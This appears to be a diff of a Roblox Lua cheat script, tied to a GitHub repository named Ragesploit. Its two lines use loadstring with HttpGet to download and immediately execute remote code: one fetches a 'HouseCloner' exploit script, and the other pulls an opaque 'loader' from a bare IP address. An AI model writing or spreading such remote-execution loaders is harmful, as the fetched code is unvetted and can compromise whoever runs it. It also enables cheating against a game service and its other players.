@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/HouseCloner/HouseCloner.lua"))();
+RUNAFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/Ragesploit-x/Ragesploit/refs/heads/main/HouseCloner/HouseCloner.lua"))();
 
 loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImRmMjkyZTViLWJhMTUtNDQxMS1hYzhmLTliODYwNDlmYjAwMSIsImtpbmQiOiJsb2FkZXIifQ"))()
